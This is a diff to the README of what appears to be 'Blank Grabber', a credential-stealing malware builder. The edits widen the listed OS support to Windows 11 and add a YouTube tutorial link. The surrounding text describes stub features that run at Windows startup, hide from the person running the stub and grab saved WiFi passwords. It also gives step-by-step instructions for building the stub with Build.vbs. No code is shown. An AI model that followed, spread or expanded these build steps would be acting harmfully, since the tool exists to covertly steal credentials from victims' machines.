@@ -66,11 +66,11 @@
 | **Startup** | Runs the stub on Windows starup. |
 | **Hide** | Hide the stub when someone runs it. |
 
-**Supports:** *Windows 10*
+**Supports:** *Windows 10/11 (untested)*
 
 ## Requirements
 **To build the stub, you need:**
-- Windows 10.
+- Windows 10/11 (untested).
 - Python 3.
 - An active internet connection.
 
@@ -83,6 +83,8 @@
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Blank Grabber** folder and double click *Build.vbs* file.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+
+[![Tutorial video](https://img.shields.io/badge/YouTube-Watch%20Tutorial-C4302B?style=for-the-badge&logo=youtube)](https://www.youtube.com/watch?v=QoXH1YWBcd8)
 
 ## To-Do/Enhancements
 - [x] Grab saved WIFI passwords.
